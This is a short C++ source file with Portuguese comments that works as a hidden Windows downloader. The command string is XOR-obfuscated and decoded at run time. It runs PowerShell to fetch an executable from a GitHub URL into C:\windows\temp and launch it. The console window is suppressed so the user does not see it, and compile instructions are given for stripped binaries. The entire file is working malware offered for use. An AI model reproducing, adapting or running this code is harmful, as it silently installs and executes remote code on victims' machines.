// @AndreyQuerino
//
// Compilação linux g++/i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
// Compilação windows g++ -std=c++11 a.cpp -o a.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//
// O programa vai fazer download via powerhell do arquivo MrQuerino.exe direto na pasta temp e na sequencia executar


#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

void Decrypter(char Encrypt_Decrypt[]) {  
    char Chave[2] = {4, 4}; //chave
    int crypit = strlen(Encrypt_Decrypt); 
    for (int i = 0; i < crypit; i++){ 
        Encrypt_Decrypt[i] = Encrypt_Decrypt[i] ^ Chave[i % (sizeof(Chave) / sizeof(char))];
    } 
} 

void Run() {
   char acao[] = "tksavwlahh*a|a$scap$lpptw>++cmplqf*gki+ej`va}uqavmjk+Gkmwew+fhkf+iemj+G+IvUqavmjk+IvUqavmjk*a|a;ves9pvqa$)k$G>Xsmj`kswXpaitXSahGkiaIv*a|a?wpevp$G>Xsmj`kswXpaitXSahGkiaIv*a|a"; // powershell.exe wget https://github.com/andreyquerino/Coisas/blob/main/C/MrQuerino/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelComeMr.exe;start C:\\windows\\temp\\WelComeMr.exe
   Decrypter(acao);
   STARTUPINFO info;
   PROCESS_INFORMATION processo;
   memset(&info, 0, sizeof(info));
   CreateProcess(NULL, acao, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processo);
}

int main() {
    FreeConsole(); // Não visivél para o usuário
    Run();
    return 0;
}

